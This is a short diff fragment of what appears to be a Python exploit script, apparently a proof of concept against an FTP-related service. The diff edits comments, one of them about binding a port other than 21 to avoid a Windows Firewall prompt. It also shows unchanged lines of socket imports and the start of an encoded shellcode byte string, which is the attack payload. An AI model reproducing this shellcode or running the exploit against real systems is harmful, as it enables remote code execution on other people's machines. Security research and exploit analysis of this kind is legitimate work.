@@ -7,7 +7,8 @@
 import socket
 import sys
 
-#MsgBox "We are evil"
+# MsgBox "We are evil"
+# As Windows Firewall ask for exception in order to listen on port 21, it is possible to bind another port with default settings.
 shellcode=  b""
 shellcode+= b"\xdb\xc5\xb8\xfd\xbe\x73\x9e\xd9\x74\x24\xf4\x5e\x33"
 shellcode+= b"\xc9\xb1\x42\x31\x46\x19\x03\x46\x19\x83\xee\xfc\x1f"
